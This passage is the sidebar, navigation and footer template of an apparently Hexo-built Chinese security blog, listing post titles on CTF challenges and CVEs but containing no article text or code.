+  
+    <a href="/2020/02/03/five86-1-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">five86:1-vulnhub渗透测试</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
